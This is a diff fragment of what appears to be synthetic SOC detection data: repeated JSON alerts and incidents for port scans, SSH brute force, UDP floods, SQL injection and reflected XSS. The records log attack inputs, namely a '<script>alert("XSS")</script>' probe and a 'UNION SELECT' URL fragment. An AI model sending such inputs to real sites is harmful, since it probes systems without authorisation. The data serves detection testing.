+      "status": "NEW",
+      "mitreTechniques": [],
+      "evidence": [
+        "Pattern detected: UNION SELECT",
+        "HTTP 500 error triggered on downstream database",
+        "Agent: ApplicationAgent",
+        "Detection Method: Regex Signature & AST Anomaly Analyzer",
+        "Severity Rule: Multi-Stage Infiltration & Critical Compromise (Assigned Critical severity under Multi-Stage Infiltration & Critical Compromise: Risk score is 92/100 with Exploitation pattern detected: SQL_INJECTION.)"
+      ],
+      "id": "ALT-1789665905525-ffumv",
+      "createdAt": "2026-09-17T17:25:05.525Z"
+    },
+    {
+      "alertId": "ALT-905519-CX0U",
+      "incidentId": "INC-20260917-U6JSJ",
+      "title": "SSH Credential Brute Force",
+      "description": "Rapid failed authentication attempts exceeding 30 attempts per minute",
+      "alertType": "BRUTE_FORCE",
+      "severity": "HIGH",
+      "riskScore": 84,
+      "priority": "P2",
+      "status": "NEW",
+      "mitreTechniques": [],
+      "evidence": [
+        "Account: root, admin, test",
+        "34 failed password attempts in 45s",
+        "Agent: SystemAgent",
+        "Detection Method: Failed Authentication Thresholding",
+        "Severity Rule: Active Exploitation & Credential Abuse (Assigned High severity under Active Exploitation & Credential Abuse: Risk score is 84/100. Factors: Exploitation pattern detected: BRUTE_FORCE.)"
+      ],
+      "id": "ALT-1789665905519-6u1el",
+      "createdAt": "2026-09-17T17:25:05.519Z"
+    },
+    {
+      "alertId": "ALT-905513-5LWI",
+      "incidentId": "INC-20260917-FQZ9H",
+      "title": "SYN Port Sweep",
+      "description": "Distributed port scan targeting ports 22, 80, 443, 8080, 3389 within 2 seconds",
+      "alertType": "PORT_SCAN",
+      "severity": "HIGH",
+      "riskScore": 76,
+      "priority": "P2",
+      "status": "NEW",
+      "mitreTechniques": [],
+      "evidence": [
+        "SYN packets without ACK completion",
+        "5 distinct ports scanned in 200ms",
+        "Entropy: 0.94",
+        "Agent: NetworkAgent",
+        "Detection Method: Port Frequency & Packet Entropy Engine",
+        "Severity Rule: Active Exploitation & Credential Abuse (Assigned High severity under Active Exploitation & Credential Abuse: Risk score is 76/100. Factors: Reconnaissance / Anomaly pattern: PORT_SCAN.)"
+      ],
+      "id": "ALT-1789665905514-b6fd8",
+      "createdAt": "2026-09-17T17:25:05.514Z"
+    },
     {
       "alertId": "ALT-156633-JTE3",
       "incidentId": "INC-20260917-66XCC",
@@ -877,6 +3141,930 @@
   ],
   "incidents": [
     {
+      "incidentId": "INC-20260917-EQGQF",
+      "title": "XSS_ATTACK",
+      "description": "Reflected XSS attempt <script>alert(\"XSS\")</script>",
+      "severity": "CRITICAL",
+      "priority": "P2",
+      "status": "NEW",
+      "riskScore": 85,
+      "primaryIp": "198.51.100.222",
+      "mitreTechniques": [],
+      "investigationNotes": [
+        {
+          "id": "note-INC-20260917-EQGQF-1",
+          "author": "SOC Workflow Automation",
+          "note": "Incident automatically opened. Severity: Critical. Justification: Assigned Critical severity under Multi-Stage Infiltration & Critical Compromise: Risk score is 85/100 with .",
+          "timestamp": "2026-09-17T17:26:01.856Z"
+        }
+      ],
+      "id": "INC-20260917-EQGQF",
+      "createdAt": "2026-09-17T17:26:01.857Z"
+    },
+    {
+      "incidentId": "INC-20260917-SLJH8",
+      "title": "PORT_SCAN",
+      "description": "Repeated port scan telemetry burst",
+      "severity": "MEDIUM",
+      "priority": "P3",
+      "status": "NEW",
+      "riskScore": 60,
+      "primaryIp": "192.0.2.200",
+      "mitreTechniques": [],
+      "investigationNotes": [
+        {
+          "id": "note-INC-20260917-SLJH8-1",
+          "author": "SOC Workflow Automation",
+          "note": "Incident automatically opened. Severity: Medium. Justification: Assigned Medium severity under Anomalous Behavior & Port Reconnaissance: Risk score is 60/100. Factors: Reconnaissance / Anomaly pattern: PORT_SCAN.",
+          "timestamp": "2026-09-17T17:26:01.847Z"
+        }
+      ],
+      "id": "INC-20260917-SLJH8",
+      "createdAt": "2026-09-17T17:26:01.847Z"
+    },
+    {
+      "incidentId": "INC-20260917-3DB51",
+      "title": "PORT_SCAN",
+      "description": "Repeated port scan telemetry burst",
+      "severity": "MEDIUM",
+      "priority": "P3",
+      "status": "NEW",
+      "riskScore": 60,
+      "primaryIp": "192.0.2.200",
+      "mitreTechniques": [],
+      "investigationNotes": [
+        {
+          "id": "note-INC-20260917-3DB51-1",
+          "author": "SOC Workflow Automation",
+          "note": "Incident automatically opened. Severity: Medium. Justification: Assigned Medium severity under Anomalous Behavior & Port Reconnaissance: Risk score is 60/100. Factors: Reconnaissance / Anomaly pattern: PORT_SCAN.",
+          "timestamp": "2026-09-17T17:26:01.843Z"
+        }
+      ],
+      "id": "INC-20260917-3DB51",
+      "createdAt": "2026-09-17T17:26:01.843Z"
+    },
+    {
+      "incidentId": "INC-20260917-5ZB46",
+      "title": "PORT_SCAN",
+      "description": "Repeated port scan telemetry burst",
+      "severity": "MEDIUM",
+      "priority": "P3",
+      "status": "NEW",
+      "riskScore": 60,
+      "primaryIp": "192.0.2.200",
+      "mitreTechniques": [],
+      "investigationNotes": [
+        {
+          "id": "note-INC-20260917-5ZB46-1",
+          "author": "SOC Workflow Automation",
+          "note": "Incident automatically opened. Severity: Medium. Justification: Assigned Medium severity under Anomalous Behavior & Port Reconnaissance: Risk score is 60/100. Factors: Reconnaissance / Anomaly pattern: PORT_SCAN.",
+          "timestamp": "2026-09-17T17:26:01.839Z"
+        }
+      ],
+      "id": "INC-20260917-5ZB46",
+      "createdAt": "2026-09-17T17:26:01.839Z"
+    },
+    {
+      "incidentId": "INC-961817",
+      "title": "Privilege Escalation Intrusion Chain",
+      "description": "Multi-agent threat analysis identified 5 security anomaly events with risk score 98.",
+      "severity": "CRITICAL",
+      "priority": "P1",
+      "status": "NEW",
+      "riskScore": 98,
+      "primaryIp": "203.0.113.50",
+      "affectedHost": "server01",
+      "mitreTechniques": [
+        "T1548.003",
+        "T1190",
+        "T1595",
+        "T1046",
+        "T1110"
+      ],
+      "id": "INC-961817",
+      "createdAt": "2026-09-17T17:26:01.817Z"
+    },
+    {
+      "incidentId": "INC-20260917-RO1HQ",
+      "title": "UDP Amplification Storm",
+      "description": "Bandwidth threshold exceeded: 1.2M pps from 198.51.100.111",
+      "severity": "CRITICAL",
+      "priority": "P2",
+      "status": "RESOLVED",
+      "riskScore": 88,
+      "primaryIp": "198.51.100.111",
+      "affectedHost": "edge-router-01",
+      "mitreTechniques": [],
+      "investigationNotes": [
+        {
+          "id": "note-INC-20260917-RO1HQ-1",
+          "author": "SOC Workflow Automation",
+          "note": "Incident automatically opened. Severity: Critical. Justification: Assigned Critical severity under Multi-Stage Infiltration & Critical Compromise: Risk score is 88/100 with .",
+          "timestamp": "2026-09-17T17:26:01.810Z"
+        }
+      ],
+      "id": "INC-20260917-RO1HQ",
+      "createdAt": "2026-09-17T17:26:01.810Z",
+      "updatedAt": "2026-09-17T17:26:01.814Z"
+    },
+    {
+      "incidentId": "INC-20260917-9T43J",
+      "title": "Lateral Movement & Reconnaissance Sequence",
+      "description": "Correlated event sequence: Port Scan -> SSH Brute Force -> Web Exploit",
+      "severity": "CRITICAL",
+      "priority": "P1",
+      "status": "NEW",
+      "riskScore": 95,
+      "primaryIp": "203.0.113.88",
+      "affectedHost": "domain-controller-01",
+      "mitreTechniques": [],
+      "investigationNotes": [
+        {
+          "id": "note-INC-20260917-9T43J-1",
+          "author": "SOC Workflow Automation",
+          "note": "Incident automatically opened. Severity: Critical. Justification: Assigned Critical severity under Multi-Stage Infiltration & Critical Compromise: Risk score is 95/100 with Cross-Agent correlation active (NetworkAgent, SystemAgent, ApplicationAgent); Critical threat classification: MULTI_STAGE_KILLCHAIN.",
+          "timestamp": "2026-09-17T17:26:01.799Z"
+        }
+      ],
+      "id": "INC-20260917-9T43J",
+      "createdAt": "2026-09-17T17:26:01.800Z"
+    },
+    {
+      "incidentId": "INC-20260917-SS4WB",
+      "title": "SQL Injection via Web Parameter",
+      "description": "SQL injection attempt in GET /api/products?id=1%20UNION%20SELECT",
+      "severity": "CRITICAL",
+      "priority": "P1",
+      "status": "NEW",
+      "riskScore": 92,
+      "primaryIp": "192.0.2.144",
+      "affectedHost": "ecommerce-web-prod",
+      "mitreTechniques": [],
+      "investigationNotes": [
+        {
+          "id": "note-INC-20260917-SS4WB-1",
+          "author": "SOC Workflow Automation",
+          "note": "Incident automatically opened. Severity: Critical. Justification: Assigned Critical severity under Multi-Stage Infiltration & Critical Compromise: Risk score is 92/100 with Exploitation pattern detected: SQL_INJECTION.",
+          "timestamp": "2026-09-17T17:26:01.795Z"
+        }
+      ],
+      "id": "INC-20260917-SS4WB",
+      "createdAt": "2026-09-17T17:26:01.795Z"
+    },
+    {
+      "incidentId": "INC-20260917-CVP8V",
+      "title": "SSH Credential Brute Force",
+      "description": "Rapid failed authentication attempts exceeding 30 attempts per minute",
+      "severity": "HIGH",
+      "priority": "P2",
+      "status": "NEW",
+      "riskScore": 84,
+      "primaryIp": "198.51.100.82",
+      "affectedHost": "auth-server-01",
+      "mitreTechniques": [],
+      "investigationNotes": [
+        {
+          "id": "note-INC-20260917-CVP8V-1",
+          "author": "SOC Workflow Automation",
+          "note": "Incident automatically opened. Severity: High. Justification: Assigned High severity under Active Exploitation & Credential Abuse: Risk score is 84/100. Factors: Exploitation pattern detected: BRUTE_FORCE.",
+          "timestamp": "2026-09-17T17:26:01.791Z"
+        }
+      ],
+      "id": "INC-20260917-CVP8V",
+      "createdAt": "2026-09-17T17:26:01.791Z"
+    },
+    {
+      "incidentId": "INC-20260917-WZ1A6",
+      "title": "SYN Port Sweep",
+      "description": "Distributed port scan targeting ports 22, 80, 443, 8080, 3389 within 2 seconds",
+      "severity": "HIGH",
+      "priority": "P2",
+      "status": "NEW",
+      "riskScore": 76,
+      "primaryIp": "203.0.113.15",
+      "mitreTechniques": [],
+      "investigationNotes": [
+        {
+          "id": "note-INC-20260917-WZ1A6-1",
+          "author": "SOC Workflow Automation",
+          "note": "Incident automatically opened. Severity: High. Justification: Assigned High severity under Active Exploitation & Credential Abuse: Risk score is 76/100. Factors: Reconnaissance / Anomaly pattern: PORT_SCAN.",
+          "timestamp": "2026-09-17T17:26:01.786Z"
+        }
+      ],
+      "id": "INC-20260917-WZ1A6",
+      "createdAt": "2026-09-17T17:26:01.786Z"
+    },
+    {
+      "incidentId": "INC-EVAL-961778",
+      "title": "Automated Evaluation Incident",
+      "description": "Synthetic incident for connectivity verification",
+      "severity": "HIGH",
+      "priority": "P2",
+      "status": "NEW",
+      "riskScore": 78,
+      "primaryIp": "198.51.100.99",
+      "affectedHost": "eval-workstation",
+      "mitreTechniques": [
+        "T1110"
+      ],
+      "investigationNotes": [],
+      "id": "INC-EVAL-961778",
+      "createdAt": "2026-09-17T17:26:01.779Z"
+    },
+    {
+      "incidentId": "INC-20260917-WDZIO",
+      "title": "XSS_ATTACK",
+      "description": "Reflected XSS attempt <script>alert(\"XSS\")</script>",
+      "severity": "CRITICAL",
+      "priority": "P2",
+      "status": "NEW",
+      "riskScore": 85,
+      "primaryIp": "198.51.100.222",
+      "mitreTechniques": [],
+      "investigationNotes": [
+        {
+          "id": "note-INC-20260917-WDZIO-1",
+          "author": "SOC Workflow Automation",
+          "note": "Incident automatically opened. Severity: Critical. Justification: Assigned Critical severity under Multi-Stage Infiltration & Critical Compromise: Risk score is 85/100 with .",
+          "timestamp": "2026-09-17T17:25:32.590Z"
+        }
+      ],
+      "id": "INC-20260917-WDZIO",
+      "createdAt": "2026-09-17T17:25:32.590Z"
+    },
+    {
+      "incidentId": "INC-20260917-K1R7K",
+      "title": "PORT_SCAN",
+      "description": "Repeated port scan telemetry burst",
+      "severity": "MEDIUM",
+      "priority": "P3",
+      "status": "NEW",
+      "riskScore": 60,
+      "primaryIp": "192.0.2.200",
+      "mitreTechniques": [],
+      "investigationNotes": [
+        {
+          "id": "note-INC-20260917-K1R7K-1",
+          "author": "SOC Workflow Automation",
+          "note": "Incident automatically opened. Severity: Medium. Justification: Assigned Medium severity under Anomalous Behavior & Port Reconnaissance: Risk score is 60/100. Factors: Reconnaissance / Anomaly pattern: PORT_SCAN.",
+          "timestamp": "2026-09-17T17:25:32.587Z"
+        }
+      ],
+      "id": "INC-20260917-K1R7K",
+      "createdAt": "2026-09-17T17:25:32.587Z"
+    },
+    {
+      "incidentId": "INC-20260917-YGIF6",
+      "title": "PORT_SCAN",
+      "description": "Repeated port scan telemetry burst",
+      "severity": "MEDIUM",
+      "priority": "P3",
+      "status": "NEW",
+      "riskScore": 60,
+      "primaryIp": "192.0.2.200",
+      "mitreTechniques": [],
+      "investigationNotes": [
+        {
+          "id": "note-INC-20260917-YGIF6-1",
+          "author": "SOC Workflow Automation",
+          "note": "Incident automatically opened. Severity: Medium. Justification: Assigned Medium severity under Anomalous Behavior & Port Reconnaissance: Risk score is 60/100. Factors: Reconnaissance / Anomaly pattern: PORT_SCAN.",
+          "timestamp": "2026-09-17T17:25:32.584Z"
+        }
+      ],
+      "id": "INC-20260917-YGIF6",
+      "createdAt": "2026-09-17T17:25:32.584Z"
+    },
+    {
+      "incidentId": "INC-20260917-5RZIK",
+      "title": "PORT_SCAN",
+      "description": "Repeated port scan telemetry burst",
+      "severity": "MEDIUM",
+      "priority": "P3",
+      "status": "NEW",
+      "riskScore": 60,
+      "primaryIp": "192.0.2.200",
+      "mitreTechniques": [],
+      "investigationNotes": [
+        {
+          "id": "note-INC-20260917-5RZIK-1",
+          "author": "SOC Workflow Automation",
+          "note": "Incident automatically opened. Severity: Medium. Justification: Assigned Medium severity under Anomalous Behavior & Port Reconnaissance: Risk score is 60/100. Factors: Reconnaissance / Anomaly pattern: PORT_SCAN.",
+          "timestamp": "2026-09-17T17:25:32.581Z"
+        }
+      ],
+      "id": "INC-20260917-5RZIK",
+      "createdAt": "2026-09-17T17:25:32.582Z"
+    },
+    {
+      "incidentId": "INC-932557",
+      "title": "Privilege Escalation Intrusion Chain",
+      "description": "Multi-agent threat analysis identified 5 security anomaly events with risk score 98.",
+      "severity": "CRITICAL",
+      "priority": "P1",
+      "status": "NEW",
+      "riskScore": 98,
+      "primaryIp": "203.0.113.50",
+      "affectedHost": "server01",
+      "mitreTechniques": [
+        "T1548.003",
+        "T1190",
+        "T1595",
+        "T1046",
+        "T1110"
+      ],
+      "id": "INC-932557",
+      "createdAt": "2026-09-17T17:25:32.557Z"
+    },
+    {
+      "incidentId": "INC-20260917-LTLNP",
+      "title": "UDP Amplification Storm",
+      "description": "Bandwidth threshold exceeded: 1.2M pps from 198.51.100.111",
+      "severity": "CRITICAL",
+      "priority": "P2",
+      "status": "RESOLVED",
+      "riskScore": 88,
+      "primaryIp": "198.51.100.111",
+      "affectedHost": "edge-router-01",
+      "mitreTechniques": [],
+      "investigationNotes": [
+        {
+          "id": "note-INC-20260917-LTLNP-1",
+          "author": "SOC Workflow Automation",
+          "note": "Incident automatically opened. Severity: Critical. Justification: Assigned Critical severity under Multi-Stage Infiltration & Critical Compromise: Risk score is 88/100 with .",
+          "timestamp": "2026-09-17T17:25:32.549Z"
+        }
+      ],
+      "id": "INC-20260917-LTLNP",
+      "createdAt": "2026-09-17T17:25:32.550Z",
+      "updatedAt": "2026-09-17T17:25:32.553Z"
+    },
+    {
+      "incidentId": "INC-20260917-MONDL",
+      "title": "Lateral Movement & Reconnaissance Sequence",
+      "description": "Correlated event sequence: Port Scan -> SSH Brute Force -> Web Exploit",
+      "severity": "CRITICAL",
+      "priority": "P1",
+      "status": "NEW",
+      "riskScore": 95,
+      "primaryIp": "203.0.113.88",
+      "affectedHost": "domain-controller-01",
+      "mitreTechniques": [],
+      "investigationNotes": [
+        {
+          "id": "note-INC-20260917-MONDL-1",
+          "author": "SOC Workflow Automation",
+          "note": "Incident automatically opened. Severity: Critical. Justification: Assigned Critical severity under Multi-Stage Infiltration & Critical Compromise: Risk score is 95/100 with Cross-Agent correlation active (NetworkAgent, SystemAgent, ApplicationAgent); Critical threat classification: MULTI_STAGE_KILLCHAIN.",
+          "timestamp": "2026-09-17T17:25:32.537Z"
+        }
+      ],
+      "id": "INC-20260917-MONDL",
+      "createdAt": "2026-09-17T17:25:32.537Z"
+    },
+    {
+      "incidentId": "INC-20260917-SPROJ",
+      "title": "SQL Injection via Web Parameter",
+      "description": "SQL injection attempt in GET /api/products?id=1%20UNION%20SELECT",
+      "severity": "CRITICAL",
+      "priority": "P1",
+      "status": "NEW",
+      "riskScore": 92,
+      "primaryIp": "192.0.2.144",
+      "affectedHost": "ecommerce-web-prod",
+      "mitreTechniques": [],
+      "investigationNotes": [
+        {
+          "id": "note-INC-20260917-SPROJ-1",
+          "author": "SOC Workflow Automation",
+          "note": "Incident automatically opened. Severity: Critical. Justification: Assigned Critical severity under Multi-Stage Infiltration & Critical Compromise: Risk score is 92/100 with Exploitation pattern detected: SQL_INJECTION.",
+          "timestamp": "2026-09-17T17:25:32.533Z"
+        }
+      ],
+      "id": "INC-20260917-SPROJ",
+      "createdAt": "2026-09-17T17:25:32.533Z"
+    },
+    {
+      "incidentId": "INC-20260917-FAONI",
+      "title": "SSH Credential Brute Force",
+      "description": "Rapid failed authentication attempts exceeding 30 attempts per minute",
+      "severity": "HIGH",
+      "priority": "P2",
+      "status": "NEW",
+      "riskScore": 84,
+      "primaryIp": "198.51.100.82",
+      "affectedHost": "auth-server-01",
+      "mitreTechniques": [],
+      "investigationNotes": [
+        {
+          "id": "note-INC-20260917-FAONI-1",
+          "author": "SOC Workflow Automation",
+          "note": "Incident automatically opened. Severity: High. Justification: Assigned High severity under Active Exploitation & Credential Abuse: Risk score is 84/100. Factors: Exploitation pattern detected: BRUTE_FORCE.",
+          "timestamp": "2026-09-17T17:25:32.528Z"
+        }
+      ],
+      "id": "INC-20260917-FAONI",
+      "createdAt": "2026-09-17T17:25:32.529Z"
+    },
+    {
+      "incidentId": "INC-20260917-51P9G",
+      "title": "SYN Port Sweep",
+      "description": "Distributed port scan targeting ports 22, 80, 443, 8080, 3389 within 2 seconds",
+      "severity": "HIGH",
+      "priority": "P2",
+      "status": "NEW",
+      "riskScore": 76,
+      "primaryIp": "203.0.113.15",
+      "mitreTechniques": [],
+      "investigationNotes": [
+        {
+          "id": "note-INC-20260917-51P9G-1",
+          "author": "SOC Workflow Automation",
+          "note": "Incident automatically opened. Severity: High. Justification: Assigned High severity under Active Exploitation & Credential Abuse: Risk score is 76/100. Factors: Reconnaissance / Anomaly pattern: PORT_SCAN.",
+          "timestamp": "2026-09-17T17:25:32.522Z"
+        }
+      ],
+      "id": "INC-20260917-51P9G",
+      "createdAt": "2026-09-17T17:25:32.522Z"
+    },
+    {
+      "incidentId": "INC-EVAL-932498",
+      "title": "Automated Evaluation Incident",
+      "description": "Synthetic incident for connectivity verification",
+      "severity": "HIGH",
+      "priority": "P2",
+      "status": "NEW",
+      "riskScore": 78,
+      "primaryIp": "198.51.100.99",
+      "affectedHost": "eval-workstation",
+      "mitreTechniques": [
+        "T1110"
+      ],
+      "investigationNotes": [],
+      "id": "INC-EVAL-932498",
+      "createdAt": "2026-09-17T17:25:32.511Z"
+    },
+    {
+      "incidentId": "INC-20260917-83779",
+      "title": "XSS_ATTACK",
+      "description": "Reflected XSS attempt <script>alert(\"XSS\")</script>",
+      "severity": "CRITICAL",
+      "priority": "P2",
+      "status": "NEW",
+      "riskScore": 85,
+      "primaryIp": "198.51.100.222",
+      "mitreTechniques": [],
+      "investigationNotes": [
+        {
+          "id": "note-INC-20260917-83779-1",
+          "author": "SOC Workflow Automation",
+          "note": "Incident automatically opened. Severity: Critical. Justification: Assigned Critical severity under Multi-Stage Infiltration & Critical Compromise: Risk score is 85/100 with .",
+          "timestamp": "2026-09-17T17:25:25.459Z"
+        }
+      ],
+      "id": "INC-20260917-83779",
+      "createdAt": "2026-09-17T17:25:25.459Z"
+    },
+    {
+      "incidentId": "INC-20260917-VAOGC",
+      "title": "PORT_SCAN",
+      "description": "Repeated port scan telemetry burst",
+      "severity": "MEDIUM",
+      "priority": "P3",
+      "status": "NEW",
+      "riskScore": 60,
+      "primaryIp": "192.0.2.200",
+      "mitreTechniques": [],
+      "investigationNotes": [
+        {
+          "id": "note-INC-20260917-VAOGC-1",
+          "author": "SOC Workflow Automation",
+          "note": "Incident automatically opened. Severity: Medium. Justification: Assigned Medium severity under Anomalous Behavior & Port Reconnaissance: Risk score is 60/100. Factors: Reconnaissance / Anomaly pattern: PORT_SCAN.",
+          "timestamp": "2026-09-17T17:25:25.457Z"
+        }
+      ],
+      "id": "INC-20260917-VAOGC",
+      "createdAt": "2026-09-17T17:25:25.457Z"
+    },
+    {
+      "incidentId": "INC-20260917-0FED5",
+      "title": "PORT_SCAN",
+      "description": "Repeated port scan telemetry burst",
+      "severity": "MEDIUM",
+      "priority": "P3",
+      "status": "NEW",
+      "riskScore": 60,
+      "primaryIp": "192.0.2.200",
+      "mitreTechniques": [],
+      "investigationNotes": [
+        {
+          "id": "note-INC-20260917-0FED5-1",
+          "author": "SOC Workflow Automation",
+          "note": "Incident automatically opened. Severity: Medium. Justification: Assigned Medium severity under Anomalous Behavior & Port Reconnaissance: Risk score is 60/100. Factors: Reconnaissance / Anomaly pattern: PORT_SCAN.",
+          "timestamp": "2026-09-17T17:25:25.454Z"
+        }
+      ],
+      "id": "INC-20260917-0FED5",
+      "createdAt": "2026-09-17T17:25:25.454Z"
+    },
+    {
+      "incidentId": "INC-20260917-P4K1Z",
+      "title": "PORT_SCAN",
+      "description": "Repeated port scan telemetry burst",
+      "severity": "MEDIUM",
+      "priority": "P3",
+      "status": "NEW",
+      "riskScore": 60,
+      "primaryIp": "192.0.2.200",
+      "mitreTechniques": [],
+      "investigationNotes": [
+        {
+          "id": "note-INC-20260917-P4K1Z-1",
+          "author": "SOC Workflow Automation",
+          "note": "Incident automatically opened. Severity: Medium. Justification: Assigned Medium severity under Anomalous Behavior & Port Reconnaissance: Risk score is 60/100. Factors: Reconnaissance / Anomaly pattern: PORT_SCAN.",
+          "timestamp": "2026-09-17T17:25:25.451Z"
+        }
+      ],
+      "id": "INC-20260917-P4K1Z",
+      "createdAt": "2026-09-17T17:25:25.451Z"
+    },
+    {
+      "incidentId": "INC-925433",
+      "title": "Privilege Escalation Intrusion Chain",
+      "description": "Multi-agent threat analysis identified 5 security anomaly events with risk score 98.",
+      "severity": "CRITICAL",
+      "priority": "P1",
+      "status": "NEW",
+      "riskScore": 98,
+      "primaryIp": "203.0.113.50",
+      "affectedHost": "server01",
+      "mitreTechniques": [
+        "T1548.003",
+        "T1190",
+        "T1595",
+        "T1046",
+        "T1110"
+      ],
+      "id": "INC-925433",
+      "createdAt": "2026-09-17T17:25:25.433Z"
+    },
+    {
+      "incidentId": "INC-20260917-0ZODZ",
+      "title": "UDP Amplification Storm",
+      "description": "Bandwidth threshold exceeded: 1.2M pps from 198.51.100.111",
+      "severity": "CRITICAL",
+      "priority": "P2",
+      "status": "RESOLVED",
+      "riskScore": 88,
+      "primaryIp": "198.51.100.111",
+      "affectedHost": "edge-router-01",
+      "mitreTechniques": [],
+      "investigationNotes": [
+        {
+          "id": "note-INC-20260917-0ZODZ-1",
+          "author": "SOC Workflow Automation",
+          "note": "Incident automatically opened. Severity: Critical. Justification: Assigned Critical severity under Multi-Stage Infiltration & Critical Compromise: Risk score is 88/100 with .",
+          "timestamp": "2026-09-17T17:25:25.429Z"
+        }
+      ],
+      "id": "INC-20260917-0ZODZ",
+      "createdAt": "2026-09-17T17:25:25.429Z",
+      "updatedAt": "2026-09-17T17:25:25.431Z"
+    },
+    {
+      "incidentId": "INC-20260917-YQK26",
+      "title": "Lateral Movement & Reconnaissance Sequence",
+      "description": "Correlated event sequence: Port Scan -> SSH Brute Force -> Web Exploit",
+      "severity": "CRITICAL",
+      "priority": "P1",
+      "status": "NEW",
+      "riskScore": 95,
+      "primaryIp": "203.0.113.88",
+      "affectedHost": "domain-controller-01",
+      "mitreTechniques": [],
+      "investigationNotes": [
+        {
+          "id": "note-INC-20260917-YQK26-1",
+          "author": "SOC Workflow Automation",
+          "note": "Incident automatically opened. Severity: Critical. Justification: Assigned Critical severity under Multi-Stage Infiltration & Critical Compromise: Risk score is 95/100 with Cross-Agent correlation active (NetworkAgent, SystemAgent, ApplicationAgent); Critical threat classification: MULTI_STAGE_KILLCHAIN.",
+          "timestamp": "2026-09-17T17:25:25.419Z"
+        }
+      ],
+      "id": "INC-20260917-YQK26",
+      "createdAt": "2026-09-17T17:25:25.419Z"
+    },
+    {
+      "incidentId": "INC-20260917-FFZ3R",
+      "title": "SQL Injection via Web Parameter",
+      "description": "SQL injection attempt in GET /api/products?id=1%20UNION%20SELECT",
+      "severity": "CRITICAL",
+      "priority": "P1",
+      "status": "NEW",
+      "riskScore": 92,
+      "primaryIp": "192.0.2.144",
+      "affectedHost": "ecommerce-web-prod",
+      "mitreTechniques": [],
+      "investigationNotes": [
+        {
+          "id": "note-INC-20260917-FFZ3R-1",
+          "author": "SOC Workflow Automation",
+          "note": "Incident automatically opened. Severity: Critical. Justification: Assigned Critical severity under Multi-Stage Infiltration & Critical Compromise: Risk score is 92/100 with Exploitation pattern detected: SQL_INJECTION.",
+          "timestamp": "2026-09-17T17:25:25.416Z"
+        }
+      ],
+      "id": "INC-20260917-FFZ3R",
+      "createdAt": "2026-09-17T17:25:25.416Z"
+    },
+    {
+      "incidentId": "INC-20260917-2EQQ0",
+      "title": "SSH Credential Brute Force",
+      "description": "Rapid failed authentication attempts exceeding 30 attempts per minute",
+      "severity": "HIGH",
+      "priority": "P2",
+      "status": "NEW",
+      "riskScore": 84,
+      "primaryIp": "198.51.100.82",
+      "affectedHost": "auth-server-01",
+      "mitreTechniques": [],
+      "investigationNotes": [
+        {
+          "id": "note-INC-20260917-2EQQ0-1",
+          "author": "SOC Workflow Automation",
+          "note": "Incident automatically opened. Severity: High. Justification: Assigned High severity under Active Exploitation & Credential Abuse: Risk score is 84/100. Factors: Exploitation pattern detected: BRUTE_FORCE.",
+          "timestamp": "2026-09-17T17:25:25.412Z"
+        }
+      ],
+      "id": "INC-20260917-2EQQ0",
+      "createdAt": "2026-09-17T17:25:25.412Z"
+    },
+    {
+      "incidentId": "INC-20260917-6621T",
+      "title": "SYN Port Sweep",
+      "description": "Distributed port scan targeting ports 22, 80, 443, 8080, 3389 within 2 seconds",
+      "severity": "HIGH",
+      "priority": "P2",
+      "status": "NEW",
+      "riskScore": 76,
+      "primaryIp": "203.0.113.15",
+      "mitreTechniques": [],
+      "investigationNotes": [
+        {
+          "id": "note-INC-20260917-6621T-1",
+          "author": "SOC Workflow Automation",
+          "note": "Incident automatically opened. Severity: High. Justification: Assigned High severity under Active Exploitation & Credential Abuse: Risk score is 76/100. Factors: Reconnaissance / Anomaly pattern: PORT_SCAN.",
+          "timestamp": "2026-09-17T17:25:25.409Z"
+        }
+      ],
+      "id": "INC-20260917-6621T",
+      "createdAt": "2026-09-17T17:25:25.409Z"
+    },
+    {
+      "incidentId": "INC-EVAL-925402",
+      "title": "Automated Evaluation Incident",
+      "description": "Synthetic incident for connectivity verification",
+      "severity": "HIGH",
+      "priority": "P2",
+      "status": "NEW",
+      "riskScore": 78,
+      "primaryIp": "198.51.100.99",
+      "affectedHost": "eval-workstation",
+      "mitreTechniques": [
+        "T1110"
+      ],
+      "investigationNotes": [],
+      "id": "INC-EVAL-925402",
+      "createdAt": "2026-09-17T17:25:25.403Z"
+    },
+    {
+      "incidentId": "INC-20260917-8D1Y9",
+      "title": "XSS_ATTACK",
+      "description": "Reflected XSS attempt <script>alert(\"XSS\")</script>",
+      "severity": "CRITICAL",
+      "priority": "P2",
+      "status": "NEW",
+      "riskScore": 85,
+      "primaryIp": "198.51.100.222",
+      "mitreTechniques": [],
+      "investigationNotes": [
+        {
+          "id": "note-INC-20260917-8D1Y9-1",
+          "author": "SOC Workflow Automation",
+          "note": "Incident automatically opened. Severity: Critical. Justification: Assigned Critical severity under Multi-Stage Infiltration & Critical Compromise: Risk score is 85/100 with .",
+          "timestamp": "2026-09-17T17:25:05.577Z"
+        }
+      ],
+      "id": "INC-20260917-8D1Y9",
+      "createdAt": "2026-09-17T17:25:05.577Z"
+    },
+    {
+      "incidentId": "INC-20260917-S6YCX",
+      "title": "PORT_SCAN",
+      "description": "Repeated port scan telemetry burst",
+      "severity": "MEDIUM",
+      "priority": "P3",
+      "status": "NEW",
+      "riskScore": 60,
+      "primaryIp": "192.0.2.200",
+      "mitreTechniques": [],
+      "investigationNotes": [
+        {
+          "id": "note-INC-20260917-S6YCX-1",
+          "author": "SOC Workflow Automation",
+          "note": "Incident automatically opened. Severity: Medium. Justification: Assigned Medium severity under Anomalous Behavior & Port Reconnaissance: Risk score is 60/100. Factors: Reconnaissance / Anomaly pattern: PORT_SCAN.",
+          "timestamp": "2026-09-17T17:25:05.574Z"
+        }
+      ],
+      "id": "INC-20260917-S6YCX",
+      "createdAt": "2026-09-17T17:25:05.575Z"
+    },
+    {
+      "incidentId": "INC-20260917-9L8NH",
+      "title": "PORT_SCAN",
+      "description": "Repeated port scan telemetry burst",
+      "severity": "MEDIUM",
+      "priority": "P3",
+      "status": "NEW",
+      "riskScore": 60,
+      "primaryIp": "192.0.2.200",
+      "mitreTechniques": [],
+      "investigationNotes": [
+        {
+          "id": "note-INC-20260917-9L8NH-1",
+          "author": "SOC Workflow Automation",
+          "note": "Incident automatically opened. Severity: Medium. Justification: Assigned Medium severity under Anomalous Behavior & Port Reconnaissance: Risk score is 60/100. Factors: Reconnaissance / Anomaly pattern: PORT_SCAN.",
+          "timestamp": "2026-09-17T17:25:05.572Z"
+        }
+      ],
+      "id": "INC-20260917-9L8NH",
+      "createdAt": "2026-09-17T17:25:05.572Z"
+    },
+    {
+      "incidentId": "INC-20260917-52HFJ",
+      "title": "PORT_SCAN",
+      "description": "Repeated port scan telemetry burst",
